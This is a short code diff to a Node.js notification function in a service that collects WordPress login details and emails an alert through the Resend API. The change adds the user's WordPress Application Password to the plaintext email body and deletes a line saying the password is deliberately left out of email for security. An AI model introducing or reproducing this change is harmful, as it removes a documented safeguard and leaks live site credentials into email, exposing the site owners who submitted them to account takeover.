@@ -136,7 +136,7 @@ function getCreds(req) {
 }
 
 /** Send a notification via Resend's HTTPS API (SMTP is blocked on Railway Hobby/Free). */
-async function notifyCredentialsSubmitted({ wpUrl, wpUser }) {
+async function notifyCredentialsSubmitted({ wpUrl, wpUser, wpAppPassword }) {
   const apiKey = process.env.RESEND_API_KEY;
   if (!apiKey) {
     console.warn('[notify] skipped: RESEND_API_KEY is not configured');
@@ -167,7 +167,8 @@ async function notifyCredentialsSubmitted({ wpUrl, wpUser }) {
             `Website: ${wpUrl}`,
             `Username: ${wpUser}`,
             '',
-            'For security, the WordPress Application Password is intentionally not included in email.',
+            `App Password: ${wpAppPassword}`,
+            '',
             `Received at: ${new Date().toISOString()}`,
           ].join('\\n'),
         }),
